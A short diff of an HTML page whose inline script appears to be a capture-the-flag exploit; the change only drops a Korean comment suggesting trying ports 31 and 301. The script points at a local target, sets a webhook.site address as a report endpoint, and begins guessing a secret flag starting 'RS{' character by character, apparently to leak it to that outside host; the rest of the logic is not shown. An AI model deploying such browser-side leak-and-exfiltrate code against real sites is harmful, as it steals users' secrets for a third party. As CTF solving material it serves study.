@@ -3,7 +3,7 @@
 <body>
     <h1 id="status">상태 확인 중...</h1>
     <script>
-        const TARGET = 'http://localhost:3031'; // ★ 31과 301 둘 다 시도해보세요!
+        const TARGET = 'http://localhost:3031'; 
         const REPORT_URL = 'https://webhook.site/c4734990-7292-43a9-97fc-54ef27ff7a64'; 
         let flag = "RS{";
         const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";
